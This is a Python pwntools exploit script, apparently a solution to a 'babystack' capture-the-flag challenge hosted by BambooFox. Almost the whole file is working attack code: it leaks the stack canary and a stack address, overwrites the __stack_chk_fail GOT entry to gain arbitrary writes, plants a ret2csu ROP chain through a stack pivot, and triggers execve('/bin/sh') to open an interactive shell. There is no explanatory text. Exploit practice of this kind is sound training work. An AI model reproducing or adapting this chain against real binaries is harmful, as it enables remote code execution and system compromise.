from pwn import *
context.terminal = ['tmux', 'split-window', '-h']
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './babystack'
HOST = 'chall.ctf.bamboofox.tw'
# HOST = '172.18.0.2'
PORT = 10102
# PORT = 10101

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


point = 0x401402
leave = 0x401452
rbp = 0x00401169
rdi = 0x004014bb

csu_load = 0x4014b2
csu_exec = 0x401498
syscall = 0x401437

pivot_head = 0x0000000000403478
words = 0x403e10

def shell():
    while(1):
        r = start()
        r.sendlineafter(': ', 'A')
        r.sendafter(': ', 'A'*0x10)
        r.sendafter(': ', 'A'*9)
        r.recvuntil('A'*9)
        try:
            canary = u64('\x00'+r.recv(7))
            leak = u64(r.recvuntil('\n', True) + '\x00'*2)
            break
        except:
            r.close()
            continue
    stack = leak
    environ = stack + 0x178
    r.sendafter(': ', 'B')

    r.sendafter(': ', '\x00'*0x10)
    r.sendafter(': ', '\x02'*0x28 + flat(canary, elf.got.__stack_chk_fail + 0x50))
    r.send(p64(point) + flat(elf.plt.read+6, elf.plt.memcmp+6))

    def aaw(what, where):
        r.send('\x00'*0x10)
        r.send('\x01'*0x28 + flat(canary, where + 0x50))
        r.send(what)

    payload = ''
    payload += flat(csu_load, 0, 1, elf.got.read, 0, words, 0x3b, csu_exec, 1, 2, 3, 4, 5, 6, 7)
    payload += flat(csu_load, 0, 1, words+8, words, 0, environ, csu_exec)

    for i in range(0, len(payload), 0x18):
        aaw(payload[i:i+0x18].ljust(0x18, 'Z'), pivot_head+i)

    aaw(flat(leave), elf.got.__stack_chk_fail)
    sleep(0.2)

    payload =  ''
    payload += '/bin/sh\x00'
    payload += p64(syscall)
    payload =  payload.ljust(0x3b, 'A')

    r.send(payload)
    if args.D:
        debug(r, [0x1452])

    r.sendline('exec 1>&0')
    r.interactive()

shell()

